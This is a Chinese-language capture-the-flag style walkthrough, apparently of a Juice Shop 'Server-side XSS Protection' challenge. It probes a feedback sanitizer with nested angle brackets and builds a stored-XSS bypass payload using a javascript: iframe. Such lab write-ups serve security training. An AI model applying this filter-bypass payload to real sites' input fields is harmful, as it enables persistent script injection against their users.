- Server-side XSS Protection
    - 描述：使用 
        ```html
        <iframe src="javascript:alert(`xss`)">
        ``` 
        绕过客户端安全机制进行持久化的XSS攻击。
    - 访问“关于我们”页面，其中展示了包含 HTML 标记的“用户反馈”
        - 请求
            ```GET /api/Feedbacks/ HTTP/1.1```
        - 响应
            ```json
            {
                "UserId": null,
                "id": 6,
                "comment": "This is <b>the</b> store for awesome stuff of all kinds! (anonymous)",
                "rating": 4,
                "createdAt": "2025-12-12T12:25:43.423Z",
                "updatedAt": "2025-12-12T12:25:43.423Z"
            }
            ```
    - 尝试注入用户反馈
        - 输入
            ```aaa<bbb>ccc<<ddd>>eee<<<fff>ggg>hhh>iii```
            响应
            ```aaaccc<>eee<<ggg>hhh>iii```
        - 第一组尖括号，```<bbb>``` 尖括号与内容被完全删除。
            第二组双重尖括号，```<<ddd>>```只删除了最里层的尖括号及其内容。
            第三组复合尖括号，```<<<fff>ggg>hhh>``` 与第二组相同。
        - 使用多层尖括号时，此处的过滤仅删除最里层的尖括号一次
        - 构建攻击向量
            格式为 ```<<删除内容>攻击向量>```
            ```<<xx>iframe src=\"javascript:alert(`xss`)\">>```
    
    - 示例解决方案的其他方法：对文件的分析得到依赖项版本，搜索得到已知漏洞研究，使用此研究的攻击向量（与上面的相似）
        第二个触发点在管理页面显示的用户反馈中